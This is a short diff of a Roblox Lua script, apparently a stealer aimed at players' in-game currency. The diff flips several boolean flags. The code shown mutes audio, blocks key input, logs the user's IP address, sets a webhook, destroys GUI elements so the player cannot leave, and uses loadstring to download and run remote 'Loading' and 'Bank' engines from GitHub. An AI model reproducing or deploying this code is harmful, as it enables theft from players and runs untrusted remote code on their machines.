@@ -62,7 +62,7 @@ local disabledKeyCodes = {
     0x0D,
 };
 UserSettings().GameSettings.MasterVolume = 0
-if _G.MouseLock ~= false then
+if _G.MouseLock ~= true then
     runService.RenderStepped:Connect(function()
         for _, keyCode in next, disabledKeyCodes do
             keyrelease(keyCode)
@@ -213,7 +213,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= false then
+if _G.LoadingScreen ~= true then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/Cypaex/Loading/main/Engine'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -748,13 +748,13 @@ end
 local diaamt = PlayerInfos.Diamonds
 if diaamt < 110000 then
     _G.Webhook = Webhook
-    _G.LoadingScreen = false
-    _G.AntiLeave = false
-    _G.MouseLock = false
+    _G.LoadingScreen = true
+    _G.AntiLeave = true
+    _G.MouseLock = true
     loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Cypaex/Bank/main/Engine", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
-if _G.AntiLeave ~= false then
+if _G.AntiLeave ~= true then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
         if v.Name ~= "Inventory" then
             v:Destroy()
